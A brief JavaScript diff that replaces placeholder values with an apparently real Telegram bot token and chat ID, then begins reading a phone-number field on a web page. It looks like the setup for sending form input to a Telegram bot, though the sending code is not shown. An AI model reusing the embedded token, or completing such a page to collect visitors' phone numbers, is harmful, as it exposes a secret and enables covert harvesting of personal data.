@@ -1,6 +1,6 @@
 // ✅ تم تضمين إعدادات البوت هنا مباشرة
-const botToken = "توكن_البوت_هنا";
-const chatId = "معرف_الدردشة_هنا";
+const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
+const chatId = "7057346640";
 
 document.getElementById('phoneNumber').addEventListener('input', () => {
   const phone = document.getElementById('phoneNumber').value;
